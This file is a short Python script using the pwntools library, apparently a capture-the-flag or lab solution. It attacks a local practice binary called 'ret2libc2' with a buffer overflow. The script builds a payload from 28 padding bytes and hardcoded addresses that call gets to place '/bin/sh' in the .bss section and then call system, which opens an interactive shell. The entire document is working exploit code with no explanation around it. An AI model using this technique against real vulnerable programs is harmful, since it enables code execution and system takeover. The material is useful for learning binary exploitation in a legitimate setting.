from pwn import*
o = process("./ret2libc2")

call_gets = 0x8048461
gets_plt = 0x8048300 
bss = 0x804A020
call_system = 0x8048449 
payload = b'a'*28
payload += p32(gets_plt) + p32(call_system) + p32(bss)
pause()
o.sendline(payload)

o.sendline("/bin/sh")
o.interactive()
